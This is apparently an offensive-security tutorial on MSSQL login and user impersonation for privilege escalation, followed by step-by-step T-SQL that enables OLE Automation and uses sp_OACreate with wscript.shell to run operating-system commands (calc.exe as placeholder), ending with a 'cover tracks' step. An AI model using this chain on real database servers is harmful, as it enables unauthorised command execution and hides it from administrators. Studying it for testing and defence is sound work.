MSSQL Server supports impersonation through EXECUTE_AS statment, and there are two main context: Execute As Login and Execute As user. Both allow you to temporarily assume another identity, but they operate in different scopes.

**Execute As Login**

Scope: Server-Level
When you run EXECUTE AS LOGIN = 'login_name', SQL server switches your security context to that login across the entire server.
This means you inherit all server-level permissions of that login, including access to multiple databases if the login has rights there
If a lower privilege account can impersonate a more privileged login (like sa), it can escalate to full administrative control.

**Execute As User**

Scope: Database-level
When you run EXECUTE AS USER = 'user_name' , SQL Server changes your context only within the current database.
You inherit the permissions of that database user, but you don't automatically gain server-wide rights.
If a user can impersonate dbo or another powerful database user, they can escalate privileges inside that database. potentially chaining it with other misconfigurations to reach higher levels.

Login impersonation - affects the entire server

User Impersonation - affects only the current database.

**Code Execution**
As a sysadmin role membership, we can obtain code execution on the Windows server hosting the MSSQL database using the xp_cmdshell stored procedure. Although disabled by default in modern versions, a sysadmin can re-enable it via the sp_configure. The commands then run under the security context of SQL server service account.

As xp_cmdshell is widely recognized to it may be not available. In that case, we can use OLE Automation Procedures, specifically sp_OACreate and sp_OAMethod. These allow SQL Server to interact with the COM objects.
The attack vector follows three step logic Create, Store and Execute. 
First, we use the sp_OACreate to instantiate the windows script host object, specifically wscipt.shell. 
Second, we store the resulting object handle in an integer variable. 
Finally, we pass the handle to sp_OAMethod to invoke the run method and execute OS commands such as spawning a shell or launching an executable.

Step 1: Expose advanced configuration settings
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO

Step 2: Enable OLE Automation procedures
Exec sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
GO

Step 3: Execute the OLE Automation Payload (Create -> Store -> Execute)
DECLARE @myrevshell INT;
Create the COM object and store the handle
EXEC sp_OACreate 'wscript.shell', @myrevshell OUTPUT;
Execute the Run method via the stored handle
EXEC sp_OAMethod @myrevshell, 'Run' NULL, 'calc.exe';
GO

STEP 4: Cleanup / Cover tracks (Disable the features)
EXEC sp_configure 'Ole Automation Procedures', 0;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
GO
